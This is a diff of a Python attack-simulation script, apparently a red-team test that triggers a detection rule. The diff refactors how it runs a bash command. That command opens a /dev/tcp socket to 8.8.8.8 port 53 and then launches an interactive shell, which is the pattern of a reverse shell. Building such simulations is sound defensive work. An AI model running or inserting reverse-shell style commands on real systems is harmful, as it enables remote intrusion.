@@ -4,11 +4,11 @@
 # 2.0.
 
 import logging
-import subprocess
 
-from . import OSType, register_code_rta
+from . import OSType, register_code_rta, RuleMetadata, _common
 
 log = logging.getLogger(__name__)
+
 
 @register_code_rta(
     id="a5603982-8b43-4ea9-b8de-112d9817e12d",
@@ -24,9 +24,5 @@ def main() -> None:
     bash_command = 'exec 3<>/dev/tcp/8.8.8.8/53; echo -e "Connection Test" >&3; exec 3<&-; exec 3>&-; exec bash -i'
     log.info("Executing the bash command...")
     # Use subprocess.Popen to execute the bash command
-    subprocess.Popen(["bash", "-c", bash_command])  # noqa: S603 S607
+    _ = _common.execute_command(["bash", "-c", bash_command])
     log.info("Simulation successful!")
-
-
-if __name__ == "__main__":
-    main()
